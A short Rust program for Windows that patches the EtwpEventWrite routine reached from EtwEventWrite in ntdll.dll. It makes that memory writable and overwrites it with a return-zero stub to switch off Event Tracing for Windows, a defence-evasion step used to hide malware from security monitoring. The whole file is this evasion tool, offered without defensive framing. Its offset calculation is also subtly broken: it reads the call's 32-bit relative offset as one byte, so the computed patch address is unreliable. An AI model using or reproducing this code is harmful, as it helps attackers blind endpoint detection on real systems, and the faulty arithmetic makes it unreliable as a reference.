use std::ffi::{c_void, CString};
use windows::core::{s, PCSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};

fn main() {
    let event_write: *const u8 = CString::new("EtwEventWrite").unwrap().into_raw() as _;
    patch_etw(event_write);
}

fn patch_etw(function: *const u8) {
    unsafe {
        let hook: [u8; 3] = [0x33, 0xC0, 0xC3];
        let h_module = GetModuleHandleA(s!("ntdll.dll")).expect("[!] GetModuleHandleA Failed");
        let address = GetProcAddress(h_module, PCSTR(function)).expect("[!] GetProcAddress Failed");
        let address_ptr = address as *mut c_void;
        let mut count = 0;
        loop {
            let opcode_c3 = *(address_ptr as *const u8).add(count);
            let opcode_cc = *(address_ptr as *const u8).add(count + 1);
            if opcode_c3 == 0xC3 && opcode_cc == 0xCC {
                break;
            }
            count += 1;
        }

        loop {
            let opcode_c3 = *(address_ptr as *const u8).add(count);
            if opcode_c3 == 0xE8 {
                let relative_offset_ptr = address_ptr.add(count + 1) as *const u8;

                // Calculates the absolute address of the call destination
                // `count + 5` because the offset is relative to the next address of the instruction,
                // which is the current address + size of the call opcode (1 byte) + size of the offset (4 bytes)
                // Patch EtwpEventWrite
                let call_destination_address = address as isize + count as isize + 5 + *relative_offset_ptr as isize;

                println!("Call destination address: 0x{:X}", call_destination_address);
                let mut old_protection = PAGE_PROTECTION_FLAGS(0);
                VirtualProtect(
                    call_destination_address as *mut c_void,
                    hook.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protection,
                ).unwrap_or_else(|e| {
                    panic!("[!] VirtualProtect Failed With Error: {e}");
                });

                std::ptr::copy_nonoverlapping(
                    hook.as_ptr(),
                    call_destination_address as _,
                    hook.len(),
                );

                VirtualProtect(
                    call_destination_address as *mut c_void,
                    hook.len(),
                    old_protection,
                    &mut old_protection,
                ).unwrap_or_else(|e| {
                    panic!("[!] VirtualProtect Failed With Error: {e}");
                });

                println!("[+] Patch ETW Finish!");

                break;
            }
            count -= 1;
        }
    }
}
